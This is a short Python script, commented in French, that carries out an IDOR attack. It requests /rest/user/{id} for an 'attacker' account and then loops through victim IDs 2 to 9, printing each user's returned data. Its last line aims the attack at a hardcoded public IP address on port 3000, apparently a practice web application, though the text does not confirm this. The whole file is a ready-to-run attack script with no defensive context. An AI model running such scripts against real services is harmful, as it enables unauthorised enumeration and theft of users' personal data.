import requests

def idor_attack(base_url, victim_ids, attacker_id):
    """
    Simule une attaque IDOR pour accéder aux données de plusieurs utilisateurs.
    """
    attacker_url = f"{base_url}/rest/user/{attacker_id}"

    # Requête légitime pour l'attaquant
    print(f"\n[ACCESSING ATTACKER'S DATA] {attacker_url}")
    attacker_response = requests.get(attacker_url)
    if attacker_response.status_code == 200:
        print(f"[SUCCESS] Attacker's data: {attacker_response.json()}")
    else:
        print(f"[FAILED] Unable to access attacker's data (Status: {attacker_response.status_code})")

    # Tentative d'accès aux données des victimes
    print("\n[STARTING IDOR ATTACK]")
    for victim_id in victim_ids:
        victim_url = f"{base_url}/rest/user/{victim_id}"
        victim_response = requests.get(victim_url)
        if victim_response.status_code == 200:
            print(f"[SUCCESS] Accessed victim's data (ID: {victim_id}): {victim_response.json()}")
        else:
            print(f"[FAILED] Unable to access victim's data (ID: {victim_id}) - Status: {victim_response.status_code}")

# Test avec une plage d'IDs utilisateurs
idor_attack("http://45.76.47.218:3000", victim_ids=range(2, 10), attacker_id=1)

